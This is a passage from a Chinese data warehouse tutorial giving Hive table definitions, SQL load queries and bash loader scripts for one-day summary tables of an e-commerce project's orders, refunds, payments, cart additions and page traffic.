‘一级分类id’,</p><p>`category1_name` STRING COMMENT ‘一级分类名称’,</p><p>`category2_id` STRING COMMENT ‘一级分类id’,</p><p>`category2_name` STRING COMMENT ‘一级分类名称’,</p><p>`category3_id` STRING COMMENT ‘一级分类id’,</p><p>`category3_name` STRING COMMENT ‘一级分类名称’,</p><p>`tm_id` STRING COMMENT ‘品牌id’,</p><p>`tm_name` STRING COMMENT ‘品牌名称’,</p><p>`order_refund_count_1d` BIGINT COMMENT ‘最近1日退单次数’,</p><p>`order_refund_num_1d` BIGINT COMMENT ‘最近1日退单件数’,</p><p>`order_refund_amount_1d` DECIMAL(16, 2) COMMENT ‘最近1日退单金额’</p><p>) COMMENT ‘交易域用户商品粒度退单最近1日汇总事实表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION ‘/warehouse/gmall/dws/dws_trade_user_sku_order_refund_1d’</p><p>TBLPROPERTIES (‘orc.compress’ = ‘snappy’);</p><p><strong>2）数据装载</strong></p><p><strong>（1）首日装载</strong></p><p>set hive.exec.dynamic.partition.mode=nonstrict;</p><p>insert overwrite table dws_trade_user_sku_order_refund_1d partition(dt)</p><p>select</p><p>user_id,</p><p>sku_id,</p><p>sku_name,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>tm_id,</p><p>tm_name,</p><p>order_refund_count,</p><p>order_refund_num,</p><p>order_refund_amount,</p><p>dt</p><p>from</p><p>(</p><p>select</p><p>dt,</p><p>user_id,</p><p>sku_id,</p><p>count(*) order_refund_count,</p><p>sum(refund_num) order_refund_num,</p><p>sum(refund_amount) order_refund_amount</p><p>from dwd_trade_order_refund_inc</p><p>group by dt,user_id,sku_id</p><p>)od</p><p>left join</p><p>(</p><p>select</p><p>id,</p><p>sku_name,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>tm_id,</p><p>tm_name</p><p>from dim_sku_full</p><p>where dt=’2020-06-14’</p><p>)sku</p><p>on od.sku_id=sku.id;</p><p><strong>（2）每日装载</strong></p><p>insert overwrite table dws_trade_user_sku_order_refund_1d<br>partition(dt=’2020-06-15’)</p><p>select</p><p>user_id,</p><p>sku_id,</p><p>sku_name,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>tm_id,</p><p>tm_name,</p><p>order_refund_count,</p><p>order_refund_num,</p><p>order_refund_amount</p><p>from</p><p>(</p><p>select</p><p>user_id,</p><p>sku_id,</p><p>count(*) order_refund_count,</p><p>sum(refund_num) order_refund_num,</p><p>sum(refund_amount) order_refund_amount</p><p>from dwd_trade_order_refund_inc</p><p>where dt=’2020-06-15’</p><p>group by user_id,sku_id</p><p>)od</p><p>left join</p><p>(</p><p>select</p><p>id,</p><p>sku_name,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>tm_id,</p><p>tm_name</p><p>from dim_sku_full</p><p>where dt=’2020-06-15’</p><p>)sku</p><p>on od.sku_id=sku.id;</p><h4 id="交易域用户粒度订单最近1日汇总表"><a href="#交易域用户粒度订单最近1日汇总表" class="headerlink" title="交易域用户粒度订单最近1日汇总表"></a>交易域用户粒度订单最近1日汇总表</h4><p><strong>1）建表语句</strong></p><p>DROP TABLE IF EXISTS dws_trade_user_order_1d;</p><p>CREATE EXTERNAL TABLE dws_trade_user_order_1d</p><p>(</p><p>`user_id` STRING COMMENT ‘用户id’,</p><p>`order_count_1d` BIGINT COMMENT ‘最近1日下单次数’,</p><p>`order_num_1d` BIGINT COMMENT ‘最近1日下单商品件数’,</p><p>`order_original_amount_1d` DECIMAL(16, 2) COMMENT<br>‘最近1日最近1日下单原始金额’,</p><p>`activity_reduce_amount_1d` DECIMAL(16, 2) COMMENT ‘最近1日下单活动优惠金额’,</p><p>`coupon_reduce_amount_1d` DECIMAL(16, 2) COMMENT ‘下单优惠券优惠金额’,</p><p>`order_total_amount_1d` DECIMAL(16, 2) COMMENT ‘最近1日下单最终金额’</p><p>) COMMENT ‘交易域用户粒度订单最近1日汇总事实表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION ‘/warehouse/gmall/dws/dws_trade_user_order_1d’</p><p>TBLPROPERTIES (‘orc.compress’ = ‘snappy’);</p><p><strong>2）数据装载</strong></p><p><strong>（1）首日装载</strong></p><p>insert overwrite table dws_trade_user_order_1d partition(dt)</p><p>select</p><p>user_id,</p><p>count(distinct(order_id)),</p><p>sum(sku_num),</p><p>sum(split_original_amount),</p><p>sum(nvl(split_activity_amount,0)),</p><p>sum(nvl(split_coupon_amount,0)),</p><p>sum(split_total_amount),</p><p>dt</p><p>from dwd_trade_order_detail_inc</p><p>group by user_id,dt;</p><p><strong>（2）每日装载</strong></p><p>insert overwrite table dws_trade_user_order_1d partition(dt=’2020-06-15’)</p><p>select</p><p>user_id,</p><p>count(distinct(order_id)),</p><p>sum(sku_num),</p><p>sum(split_original_amount),</p><p>sum(nvl(split_activity_amount,0)),</p><p>sum(nvl(split_coupon_amount,0)),</p><p>sum(split_total_amount)</p><p>from dwd_trade_order_detail_inc</p><p>where dt=’2020-06-15’</p><p>group by user_id;</p><h4 id="交易域用户粒度加购最近1日汇总表"><a href="#交易域用户粒度加购最近1日汇总表" class="headerlink" title="交易域用户粒度加购最近1日汇总表"></a>交易域用户粒度加购最近1日汇总表</h4><p><strong>1）建表语句</strong></p><p>DROP TABLE IF EXISTS dws_trade_user_cart_add_1d;</p><p>CREATE EXTERNAL TABLE dws_trade_user_cart_add_1d</p><p>(</p><p>`user_id` STRING COMMENT ‘用户id’,</p><p>`cart_add_count_1d` BIGINT COMMENT ‘最近1日加购次数’,</p><p>`cart_add_num_1d` BIGINT COMMENT ‘最近1日加购商品件数’</p><p>) COMMENT ‘交易域用户粒度加购最近1日汇总事实表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION ‘/warehouse/gmall/dws/dws_trade_user_cart_add_1d’</p><p>TBLPROPERTIES (‘orc.compress’ = ‘snappy’);</p><p><strong>2）数据装载</strong></p><p><strong>（1）首日装载</strong></p><p>insert overwrite table dws_trade_user_cart_add_1d partition(dt)</p><p>select</p><p>user_id,</p><p>count(*),</p><p>sum(sku_num),</p><p>dt</p><p>from dwd_trade_cart_add_inc</p><p>group by user_id,dt;</p><p><strong>（2）每日装载</strong></p><p>insert overwrite table dws_trade_user_cart_add_1d partition(dt=’2020-06-15’)</p><p>select</p><p>user_id,</p><p>count(*),</p><p>sum(sku_num)</p><p>from dwd_trade_cart_add_inc</p><p>where dt=’2020-06-15’</p><p>group by user_id;</p><h4 id="交易域用户粒度支付最近1日汇总表"><a href="#交易域用户粒度支付最近1日汇总表" class="headerlink" title="交易域用户粒度支付最近1日汇总表"></a>交易域用户粒度支付最近1日汇总表</h4><p><strong>1）建表语句</strong></p><p>DROP TABLE IF EXISTS dws_trade_user_payment_1d;</p><p>CREATE EXTERNAL TABLE dws_trade_user_payment_1d</p><p>(</p><p>`user_id` STRING COMMENT ‘用户id’,</p><p>`payment_count_1d` BIGINT COMMENT ‘最近1日支付次数’,</p><p>`payment_num_1d` BIGINT COMMENT ‘最近1日支付商品件数’,</p><p>`payment_amount_1d` DECIMAL(16, 2) COMMENT ‘最近1日支付金额’</p><p>) COMMENT ‘交易域用户粒度支付最近1日汇总事实表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION ‘/warehouse/gmall/dws/dws_trade_user_payment_1d’</p><p>TBLPROPERTIES (‘orc.compress’ = ‘snappy’);</p><p><strong>2）数据装载</strong></p><p><strong>（1）首日装载</strong></p><p>insert overwrite table dws_trade_user_payment_1d partition(dt)</p><p>select</p><p>user_id,</p><p>count(distinct(order_id)),</p><p>sum(sku_num),</p><p>sum(split_payment_amount),</p><p>dt</p><p>from dwd_trade_pay_detail_suc_inc</p><p>group by user_id,dt;</p><p><strong>（2）每日装载</strong></p><p>insert overwrite table dws_trade_user_payment_1d partition(dt=’2020-06-15’)</p><p>select</p><p>user_id,</p><p>count(distinct(order_id)),</p><p>sum(sku_num),</p><p>sum(split_payment_amount)</p><p>from dwd_trade_pay_detail_suc_inc</p><p>where dt=’2020-06-15’</p><p>group by user_id;</p><h4 id="交易域省份粒度订单最近1日汇总表"><a href="#交易域省份粒度订单最近1日汇总表" class="headerlink" title="交易域省份粒度订单最近1日汇总表"></a>交易域省份粒度订单最近1日汇总表</h4><p><strong>1）建表语句</strong></p><p>DROP TABLE IF EXISTS dws_trade_province_order_1d;</p><p>CREATE EXTERNAL TABLE dws_trade_province_order_1d</p><p>(</p><p>`province_id` STRING COMMENT ‘用户id’,</p><p>`province_name` STRING COMMENT ‘省份名称’,</p><p>`area_code` STRING COMMENT ‘地区编码’,</p><p>`iso_code` STRING COMMENT ‘旧版ISO-3166-2编码’,</p><p>`iso_3166_2` STRING COMMENT ‘新版版ISO-3166-2编码’,</p><p>`order_count_1d` BIGINT COMMENT ‘最近1日下单次数’,</p><p>`order_original_amount_1d` DECIMAL(16, 2) COMMENT ‘最近1日下单原始金额’,</p><p>`activity_reduce_amount_1d` DECIMAL(16, 2) COMMENT ‘最近1日下单活动优惠金额’,</p><p>`coupon_reduce_amount_1d` DECIMAL(16, 2) COMMENT ‘最近1日下单优惠券优惠金额’,</p><p>`order_total_amount_1d` DECIMAL(16, 2) COMMENT ‘最近1日下单最终金额’</p><p>) COMMENT ‘交易域省份粒度订单最近1日汇总事实表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION ‘/warehouse/gmall/dws/dws_trade_province_order_1d’</p><p>TBLPROPERTIES (‘orc.compress’ = ‘snappy’);</p><p><strong>2）数据装载</strong></p><p><strong>（1）首日装载</strong></p><p>set hive.exec.dynamic.partition.mode=nonstrict;</p><p>insert overwrite table dws_trade_province_order_1d partition(dt)</p><p>select</p><p>province_id,</p><p>province_name,</p><p>area_code,</p><p>iso_code,</p><p>iso_3166_2,</p><p>order_count_1d,</p><p>order_original_amount_1d,</p><p>activity_reduce_amount_1d,</p><p>coupon_reduce_amount_1d,</p><p>order_total_amount_1d,</p><p>dt</p><p>from</p><p>(</p><p>select</p><p>province_id,</p><p>count(distinct(order_id)) order_count_1d,</p><p>sum(split_original_amount) order_original_amount_1d,</p><p>sum(nvl(split_activity_amount,0)) activity_reduce_amount_1d,</p><p>sum(nvl(split_coupon_amount,0)) coupon_reduce_amount_1d,</p><p>sum(split_total_amount) order_total_amount_1d,</p><p>dt</p><p>from dwd_trade_order_detail_inc</p><p>group by province_id,dt</p><p>)o</p><p>left join</p><p>(</p><p>select</p><p>id,</p><p>province_name,</p><p>area_code,</p><p>iso_code,</p><p>iso_3166_2</p><p>from dim_province_full</p><p>where dt=’2020-06-14’</p><p>)p</p><p>on o.province_id=p.id;</p><p><strong>（2）每日装载</strong></p><p>insert overwrite table dws_trade_province_order_1d partition(dt=’2020-06-15’)</p><p>select</p><p>province_id,</p><p>province_name,</p><p>area_code,</p><p>iso_code,</p><p>iso_3166_2,</p><p>order_count_1d,</p><p>order_original_amount_1d,</p><p>activity_reduce_amount_1d,</p><p>coupon_reduce_amount_1d,</p><p>order_total_amount_1d</p><p>from</p><p>(</p><p>select</p><p>province_id,</p><p>count(distinct(order_id)) order_count_1d,</p><p>sum(split_original_amount) order_original_amount_1d,</p><p>sum(nvl(split_activity_amount,0)) activity_reduce_amount_1d,</p><p>sum(nvl(split_coupon_amount,0)) coupon_reduce_amount_1d,</p><p>sum(split_total_amount) order_total_amount_1d</p><p>from dwd_trade_order_detail_inc</p><p>where dt=’2020-06-15’</p><p>group by province_id</p><p>)o</p><p>left join</p><p>(</p><p>select</p><p>id,</p><p>province_name,</p><p>area_code,</p><p>iso_code,</p><p>iso_3166_2</p><p>from dim_province_full</p><p>where dt=’2020-06-15’</p><p>)p</p><p>on o.province_id=p.id;</p><h4 id="交易域用户粒度退单最近1日汇总表"><a href="#交易域用户粒度退单最近1日汇总表" class="headerlink" title="交易域用户粒度退单最近1日汇总表"></a>交易域用户粒度退单最近1日汇总表</h4><p><strong>1）建表语句</strong></p><p>DROP TABLE IF EXISTS dws_trade_user_order_refund_1d;</p><p>CREATE EXTERNAL TABLE dws_trade_user_order_refund_1d</p><p>(</p><p>`user_id` STRING COMMENT ‘用户id’,</p><p>`order_refund_count_1d` BIGINT COMMENT ‘最近1日退单次数’,</p><p>`order_refund_num_1d` BIGINT COMMENT ‘最近1日退单商品件数’,</p><p>`order_refund_amount_1d` DECIMAL(16, 2) COMMENT ‘最近1日退单金额’</p><p>) COMMENT ‘交易域用户粒度退单最近1日汇总事实表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION ‘/warehouse/gmall/dws/dws_trade_user_order_refund_1d’</p><p>TBLPROPERTIES (‘orc.compress’ = ‘snappy’);</p><p><strong>2）数据装载</strong></p><p><strong>（1）首日装载</strong></p><p>set hive.exec.dynamic.partition.mode=nonstrict;</p><p>insert overwrite table dws_trade_user_order_refund_1d partition(dt)</p><p>select</p><p>user_id,</p><p>count(*) order_refund_count,</p><p>sum(refund_num) order_refund_num,</p><p>sum(refund_amount) order_refund_amount,</p><p>dt</p><p>from dwd_trade_order_refund_inc</p><p>group by user_id,dt;</p><p><strong>（2）每日装载</strong></p><p>insert overwrite table dws_trade_user_order_refund_1d partition(dt=’2020-06-15’)</p><p>select</p><p>user_id,</p><p>count(*),</p><p>sum(refund_num),</p><p>sum(refund_amount)</p><p>from dwd_trade_order_refund_inc</p><p>where dt=’2020-06-15’</p><p>group by user_id;</p><h4 id="流量域会话粒度页面浏览最近1日汇总表"><a href="#流量域会话粒度页面浏览最近1日汇总表" class="headerlink" title="流量域会话粒度页面浏览最近1日汇总表"></a>流量域会话粒度页面浏览最近1日汇总表</h4><p><strong>1）建表语句</strong></p><p>DROP TABLE IF EXISTS dws_traffic_session_page_view_1d;</p><p>CREATE EXTERNAL TABLE dws_traffic_session_page_view_1d</p><p>(</p><p>`session_id` STRING COMMENT ‘会话id’,</p><p>`mid_id` string comment ‘设备id’,</p><p>`brand` string comment ‘手机品牌’,</p><p>`model` string comment ‘手机型号’,</p><p>`operate_system` string comment ‘操作系统’,</p><p>`version_code` string comment ‘app版本号’,</p><p>`channel` string comment ‘渠道’,</p><p>`during_time_1d` BIGINT COMMENT ‘最近1日访问时长’,</p><p>`page_count_1d` BIGINT COMMENT ‘最近1日访问页面数’</p><p>) COMMENT ‘流量域会话粒度页面浏览最近1日汇总表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION ‘/warehouse/gmall/dws/dws_traffic_session_page_view_1d’</p><p>TBLPROPERTIES (‘orc.compress’ = ‘snappy’);</p><p><strong>2）数据装载</strong></p><p>insert overwrite table dws_traffic_session_page_view_1d<br>partition(dt=’2020-06-14’)</p><p>select</p><p>session_id,</p><p>mid_id,</p><p>brand,</p><p>model,</p><p>operate_system,</p><p>version_code,</p><p>channel,</p><p>sum(during_time),</p><p>count(*)</p><p>from dwd_traffic_page_view_inc</p><p>where dt=’2020-06-14’</p><p>group by session_id,mid_id,brand,model,operate_system,version_code,channel;</p><h4 id="流量域访客页面粒度页面浏览最近1日汇总表"><a href="#流量域访客页面粒度页面浏览最近1日汇总表" class="headerlink" title="流量域访客页面粒度页面浏览最近1日汇总表"></a>流量域访客页面粒度页面浏览最近1日汇总表</h4><p><strong>1）建表语句</strong></p><p>DROP TABLE IF EXISTS dws_traffic_page_visitor_page_view_1d;</p><p>CREATE EXTERNAL TABLE dws_traffic_page_visitor_page_view_1d</p><p>(</p><p>`mid_id` STRING COMMENT ‘访客id’,</p><p>`brand` string comment ‘手机品牌’,</p><p>`model` string comment ‘手机型号’,</p><p>`operate_system` string comment ‘操作系统’,</p><p>`page_id` STRING COMMENT ‘页面id’,</p><p>`during_time_1d` BIGINT COMMENT ‘最近1日浏览时长’,</p><p>`view_count_1d` BIGINT COMMENT ‘最近1日访问次数’</p><p>) COMMENT ‘流量域访客页面粒度页面浏览最近1日汇总事实表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION ‘/warehouse/gmall/dws/dws_traffic_page_visitor_page_view_1d’</p><p>TBLPROPERTIES (‘orc.compress’ = ‘snappy’);</p><p><strong>2）数据装载</strong></p><p>insert overwrite table dws_traffic_page_visitor_page_view_1d<br>partition(dt=’2020-06-14’)</p><p>select</p><p>mid_id,</p><p>brand,</p><p>model,</p><p>operate_system,</p><p>page_id,</p><p>sum(during_time),</p><p>count(*)</p><p>from dwd_traffic_page_view_inc</p><p>where dt=’2020-06-14’</p><p>group by mid_id,brand,model,operate_system,page_id;</p><h4 id="数据装载脚本-3"><a href="#数据装载脚本-3" class="headerlink" title="数据装载脚本"></a>数据装载脚本</h4><p><strong>1）首日数据装载脚本</strong></p><p>（1）在hadoop102的/home/atguigu/bin目录下创建dwd_to_dws_1d_init.sh</p><p>[atguigu@hadoop102 bin]$ vim dwd_to_dws_1d_init.sh</p><p>（2）编写如下内容</p><p>##!/bin/bash</p><p>APP=gmall</p><p>if [ -n “$2” ] ;then</p><p>do_date=$2</p><p>else</p><p>echo “请传入日期参数”</p><p>exit</p><p>fi</p><p>dws_trade_province_order_1d=”</p><p>insert overwrite table ${APP}.dws_trade_province_order_1d partition(dt)</p><p>select</p><p>province_id,</p><p>province_name,</p><p>area_code,</p><p>iso_code,</p><p>iso_3166_2,</p><p>order_count_1d,</p><p>order_original_amount_1d,</p><p>activity_reduce_amount_1d,</p><p>coupon_reduce_amount_1d,</p><p>order_total_amount_1d,</p><p>dt</p><p>from</p><p>(</p><p>select</p><p>province_id,</p><p>count(distinct(order_id)) order_count_1d,</p><p>sum(split_original_amount) order_original_amount_1d,</p><p>sum(nvl(split_activity_amount,0)) activity_reduce_amount_1d,</p><p>sum(nvl(split_coupon_amount,0)) coupon_reduce_amount_1d,</p><p>sum(split_total_amount) order_total_amount_1d,</p><p>dt</p><p>from ${APP}.dwd_trade_order_detail_inc</p><p>group by province_id,dt</p><p>)o</p><p>left join</p><p>(</p><p>select</p><p>id,</p><p>province_name,</p><p>area_code,</p><p>iso_code,</p><p>iso_3166_2</p><p>from ${APP}.dim_province_full</p><p>where dt=’$do_date’</p><p>)p</p><p>on o.province_id=p.id;</p><p>“</p><p>dws_trade_user_cart_add_1d=”</p><p>insert overwrite table ${APP}.dws_trade_user_cart_add_1d partition(dt)</p><p>select</p><p>user_id,</p><p>count(*),</p><p>sum(sku_num),</p><p>dt</p><p>from ${APP}.dwd_trade_cart_add_inc</p><p>group by user_id,dt;</p><p>“</p><p>dws_trade_user_order_1d=”</p><p>insert overwrite table ${APP}.dws_trade_user_order_1d partition(dt)</p><p>select</p><p>user_id,</p><p>count(distinct(order_id)),</p><p>sum(sku_num),</p><p>sum(split_original_amount),</p><p>sum(nvl(split_activity_amount,0)),</p><p>sum(nvl(split_coupon_amount,0)),</p><p>sum(split_total_amount),</p><p>dt</p><p>from ${APP}.dwd_trade_order_detail_inc</p><p>group by user_id,dt;</p><p>“</p><p>dws_trade_user_order_refund_1d=”</p><p>insert overwrite table ${APP}.dws_trade_user_order_refund_1d partition(dt)</p><p>select</p><p>user_id,</p><p>count(*) order_refund_count,</p><p>sum(refund_num) order_refund_num,</p><p>sum(refund_amount) order_refund_amount,</p><p>dt</p><p>from ${APP}.dwd_trade_order_refund_inc</p><p>group by user_id,dt;</p><p>“</p><p>dws_trade_user_payment_1d=”</p><p>insert overwrite table ${APP}.dws_trade_user_payment_1d partition(dt)</p><p>select</p><p>user_id,</p><p>count(distinct(order_id)),</p><p>sum(sku_num),</p><p>sum(split_payment_amount),</p><p>dt</p><p>from ${APP}.dwd_trade_pay_detail_suc_inc</p><p>group by user_id,dt;</p><p>“</p><p>dws_trade_user_sku_order_1d=”</p><p>insert overwrite table ${APP}.dws_trade_user_sku_order_1d partition(dt)</p><p>select</p><p>user_id,</p><p>id,</p><p>sku_name,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>tm_id,</p><p>tm_name,</p><p>order_count_1d,</p><p>order_num_1d,</p><p>order_original_amount_1d,</p><p>activity_reduce_amount_1d,</p><p>coupon_reduce_amount_1d,</p><p>order_total_amount_1d,</p><p>dt</p><p>from</p><p>(</p><p>select</p><p>dt,</p><p>user_id,</p><p>sku_id,</p><p>count(*) order_count_1d,</p><p>sum(sku_num) order_num_1d,</p><p>sum(split_original_amount) order_original_amount_1d,</p><p>sum(nvl(split_activity_amount,0.0)) activity_reduce_amount_1d,</p><p>sum(nvl(split_coupon_amount,0.0)) coupon_reduce_amount_1d,</p><p>sum(split_total_amount) order_total_amount_1d</p><p>from ${APP}.dwd_trade_order_detail_inc</p><p>group by dt,user_id,sku_id</p><p>)od</p><p>left join</p><p>(</p><p>select</p><p>id,</p><p>sku_name,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>tm_id,</p><p>tm_name</p><p>from ${APP}.dim_sku_full</p><p>where dt=’$do_date’</p><p>)sku</p><p>on od.sku_id=sku.id;</p><p>“</p><p>dws_trade_user_sku_order_refund_1d=”</p><p>insert overwrite table ${APP}.dws_trade_user_sku_order_refund_1d partition(dt)</p><p>select</p><p>user_id,</p><p>sku_id,</p><p>sku_name,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>tm_id,</p><p>tm_name,</p><p>order_refund_count,</p><p>order_refund_num,</p><p>order_refund_amount,</p><p>dt</p><p>from</p><p>(</p><p>select</p><p>dt,</p><p>user_id,</p><p>sku_id,</p><p>count(*) order_refund_count,</p><p>sum(refund_num) order_refund_num,</p><p>sum(refund_amount) order_refund_amount</p><p>from ${APP}.dwd_trade_order_refund_inc</p><p>group by dt,user_id,sku_id</p><p>)od</p><p>left join</p><p>(</p><p>select</p><p>id,</p><p>sku_name,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>tm_id,</p><p>tm_name</p><p>from ${APP}.dim_sku_full</p><p>where dt=’$do_date’</p><p>)sku</p><p>on od.sku_id=sku.id;</p><p>“</p><p>dws_traffic_page_visitor_page_view_1d=”</p><p>insert overwrite table ${APP}.dws_traffic_page_visitor_page_view_1d<br>partition(dt=’$do_date’)</p><p>select</p><p>mid_id,</p><p>brand,</p><p>model,</p><p>operate_system,</p><p>page_id,</p><p>sum(during_time),</p><p>count(*)</p><p>from ${APP}.dwd_traffic_page_view_inc</p><p>where dt=’$do_date’</p><p>group by mid_id,brand,model,operate_system,page_id;</p><p>“</p><p>dws_traffic_session_page_view_1d=”</p><p>insert overwrite table ${APP}.dws_traffic_session_page_view_1d<br>partition(dt=’$do_date’)</p><p>select</p><p>session_id,</p><p>mid_id,</p><p>brand,</p><p>model,</p><p>operate_system,</p><p>version_code,</p><p>channel,</p><p>sum(during_time),</p><p>count(*)</p><p>from ${APP}.dwd_traffic_page_view_inc</p><p>where dt=’$do_date’</p><p>group by session_id,mid_id,brand,model,operate_system,version_code,channel;</p><p>“</p><p>case $1 in</p><p>“dws_trade_province_order_1d” )</p><p>hive -e “$dws_trade_province_order_1d”</p><p>;;</p><p>“dws_trade_user_cart_add_1d” )</p><p>hive -e “$dws_trade_user_cart_add_1d”</p><p>;;</p><p>“dws_trade_user_order_1d” )</p><p>hive -e “$dws_trade_user_order_1d”</p><p>;;</p><p>“dws_trade_user_order_refund_1d” )</p><p>hive -e “$dws_trade_user_order_refund_1d”</p><p>;;</p><p>“dws_trade_user_payment_1d” )</p><p>hive -e “$dws_trade_user_payment_1d”</p><p>;;</p><p>“dws_trade_user_sku_order_1d” )</p><p>hive -e “$dws_trade_user_sku_order_1d”</p><p>;;</p><p>“dws_trade_user_sku_order_refund_1d” )</p><p>hive -e “$dws_trade_user_sku_order_refund_1d”</p><p>;;</p><p>“dws_traffic_page_visitor_page_view_1d” )</p><p>hive -e “$dws_traffic_page_visitor_page_view_1d”</p><p>;;</p><p>“dws_traffic_session_page_view_1d” )</p><p>hive -e “$dws_traffic_session_page_view_1d”</p><p>;;</p><p>“all” )</p><p>hive -e<br>“$dws_trade_province_order_1d$dws_trade_user_cart_add_1d$dws_trade_user_order_1d$dws_trade_user_order_refund_1d$dws_trade_user_payment_1d$dws_trade_user_sku_order_1d$dws_trade_user_sku_order_refund_1d$dws_traffic_page_visitor_page_view_1d$dws_traffic_session_page_view_1d”</p><p>;;</p><p>esac</p><p>（3）增加脚本执行权限</p><p>[atguigu@hadoop102 bin]$ chmod +x dwd_to_dws_1d_init.sh</p><p>（4）脚本用法</p><p>[atguigu@hadoop102 bin]$ dwd_to_dws_1d_init.sh all 2020-06-14</p><p><strong>2）每日数据装载脚本</strong></p><p>（1）在hadoop102的/home/atguigu/bin目录下创建dwd_to_dws_1d.sh</p><p>[atguigu@hadoop102 bin]$ vim dwd_to_dws_1d.sh</p><p>（2）编写如下内容</p><p>##!/bin/bash</p><p>APP=gmall</p><p>## 如果输入的日期按照取输入日期；如果没输入日期取当前时间的前一天</p><p>if [ -n “$2” ] ;then</p><p>do_date=$2</p><p>else</p><p>do_date=`date -d “-1 day” +%F`</p><p>fi</p><p>dws_trade_province_order_1d=”</p><p>insert overwrite table ${APP}.dws_trade_province_order_1d<br>partition(dt=’$do_date’)</p><p>select</p><p>province_id,</p><p>province_name,</p><p>area_code,</p><p>iso_code,</p><p>iso_3166_2,</p><p>order_count_1d,</p><p>order_original_amount_1d,</p><p>activity_reduce_amount_1d,</p><p>coupon_reduce_amount_1d,</p><p>order_total_amount_1d</p><p>from</p><p>(</p><p>select</p><p>province_id,</p><p>count(distinct(order_id)) order_count_1d,</p><p>sum(split_original_amount) order_original_amount_1d,</p><p>sum(nvl(split_activity_amount,0)) activity_reduce_amount_1d,</p><p>sum(nvl(split_coupon_amount,0)) coupon_reduce_amount_1d,</p><p>sum(split_total_amount) order_total_amount_1d</p><p>from ${APP}.dwd_trade_order_detail_inc</p><p>where dt=’$do_date’</p><p>group by province_id</p><p>)o</p><p>left join</p><p>(</p><p>select</p><p>id,</p><p>province_name,</p><p>area_code,</p><p>iso_code,</p><p>iso_3166_2</p><p>from ${APP}.dim_province_full</p><p>where dt=’$do_date’</p><p>)p</p><p>on o.province_id=p.id;</p><p>“</p><p>dws_trade_user_cart_add_1d=”</p><p>insert overwrite table ${APP}.dws_trade_user_cart_add_1d<br>partition(dt=’$do_date’)</p><p>select</p><p>user_id,</p><p>count(*),</p><p>sum(sku_num)</p><p>from ${APP}.dwd_trade_cart_add_inc</p><p>where dt=’$do_date’</p><p>group by user_id;</p><p>“</p><p>dws_trade_user_order_1d=”</p><p>insert overwrite table ${APP}.dws_trade_user_order_1d partition(dt=’$do_date’)</p><p>select</p><p>user_id,</p><p>count(distinct(order_id)),</p><p>sum(sku_num),</p><p>sum(split_original_amount),</p><p>sum(nvl(split_activity_amount,0)),</p><p>sum(nvl(split_coupon_amount,0)),</p><p>sum(split_total_amount)</p><p>from ${APP}.dwd_trade_order_detail_inc</p><p>where dt=’$do_date’</p><p>group by user_id;</p><p>“</p><p>dws_trade_user_order_refund_1d=”</p><p>insert overwrite table ${APP}.dws_trade_user_order_refund_1d<br>partition(dt=’$do_date’)</p><p>select</p><p>user_id,</p><p>count(*),</p><p>sum(refund_num),</p><p>sum(refund_amount)</p><p>from ${APP}.dwd_trade_order_refund_inc</p><p>where dt=’$do_date’</p><p>group by user_id;</p><p>“</p><p>dws_trade_user_payment_1d=”</p><p>insert overwrite table ${APP}.dws_trade_user_payment_1d<br>partition(dt=’$do_date’)</p><p>select</p><p>user_id,</p><p>count(distinct(order_id)),</p><p>sum(sku_num),</p><p>sum(split_payment_amount)</p><p>from ${APP}.dwd_trade_pay_detail_suc_inc</p><p>where dt=’$do_date’</p><p>group by user_id;</p><p>“</p><p>dws_trade_user_sku_order_1d=”</p><p>insert overwrite table ${APP}.dws_trade_user_sku_order_1d<br>partition(dt=’$do_date’)</p><p>select</p><p>user_id,</p><p>id,</p><p>sku_name,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>tm_id,</p><p>tm_name,</p><p>order_count,</p><p>order_num,</p><p>order_original_amount,</p><p>activity_reduce_amount,</p><p>coupon_reduce_amount,</p><p>order_total_amount</p><p>from</p><p>(</p><p>select</p><p>user_id,</p><p>sku_id,</p><p>count(*) order_count,</p><p>sum(sku_num) order_num,</p><p>sum(split_original_amount) order_original_amount,</p><p>sum(nvl(split_activity_amount,0)) activity_reduce_amount,</p><p>sum(nvl(split_coupon_amount,0)) coupon_reduce_amount,</p><p>sum(split_total_amount) order_total_amount</p><p>from ${APP}.dwd_trade_order_detail_inc</p><p>where dt=’$do_date’</p><p>group by user_id,sku_id</p><p>)od</p><p>left join</p><p>(</p><p>select</p><p>id,</p><p>sku_name,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>tm_id,</p><p>tm_name</p><p>from ${APP}.dim_sku_full</p><p>where dt=’$do_date’</p><p>)sku</p><p>on od.sku_id=sku.id;</p><p>“</p><p>dws_trade_user_sku_order_refund_1d=”</p><p>insert overwrite table 